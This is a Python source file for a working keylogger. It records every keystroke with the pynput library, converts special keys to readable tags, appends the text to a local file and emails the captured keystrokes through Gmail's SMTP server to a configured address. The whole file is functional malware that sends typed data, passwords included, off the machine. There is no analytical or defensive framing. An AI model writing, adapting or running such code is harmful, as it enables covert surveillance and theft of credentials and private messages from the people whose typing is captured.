from os import write
from time import sleep
from threading import Thread
from sys import exit
from datetime import datetime
from pynput.keyboard import Listener
import smtplib
from email.message import EmailMessage

#Setting up connection
login = ""
password = ""
send_to = ""

try:   
    print("[?] Trying to set up SMTP")
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(login,password)
    print("[!] Success")
except:
    print("[?!] Could not log in using passed credentials")

def send_email(subject,sender,reciver,body):
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = reciver
    msg.set_content(body)

    server.send_message(msg)
    print("[!] Mail sent")

def timer_thread():
    counter = 0
    handler = ''
    while True:
        if handler == queue: counter += 1
        else: counter = 0 
        if counter == 2: save()
        handler = queue
        sleep(1.25)

def write_to_queue(data):
    global queue
    if len(str(data))<=3: data = str(data)[1:-1]
    else: data = f'{data}'
    queue = str(queue) + str(data)

def save():
    global queue

    #Correcting body
    queue = queue.replace(
        'Key.space', ' ').replace(
        'Key.ctrl_r', ' [CTRL] ').replace(
        'Key.ctrl_l', ' [CTRL] ').replace(
        'Key.alt_l', ' [ALT] ').replace(
        'Key.alt_gr', ' [ALT] ').replace(
        'Key.delete', ' [DELETE] ').replace(
        'Key.enter', ' [ENTER] ').replace(
        'Key.backspace', ' [BACKSPACE] ').replace(
        'Key.shift', ' [SHIFT] ').replace(
        'Key.tab', ' [TAB] ').replace(
        'Key.esc', ' [ESC] ').replace(
        'Key.right', ' [->] ').replace(
        'Key.left', ' [<-] ').replace(
        'Key.up', ' [/\] ').replace(
        'Key.down', ' [\/] ').replace(
        'Key.caps_lock', ' [CAPS_LCK] ').replace(
        'Key.print_screen', ' [PRINT_SCR] ').replace(
        'Key.scroll_lock', ' [SCROLL_LCK] ')

    print(f"[!] Saving")
    with open("saved_data.txt", "a", encoding="utf-8") as f:
        time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        try: f.write(f'\n{time} - {str(queue)}')
        except: f.write(f'\n{time} - undefined signs')
    send_email(time, login, send_to, str(queue))
    queue = ''

def main():
    print("[!] keylogger is running")
    timer.start()
    with Listener(on_press=write_to_queue) as l: l.join()

if __name__ == "__main__":
    queue = ''
    timer = Thread(target=timer_thread)
    main()
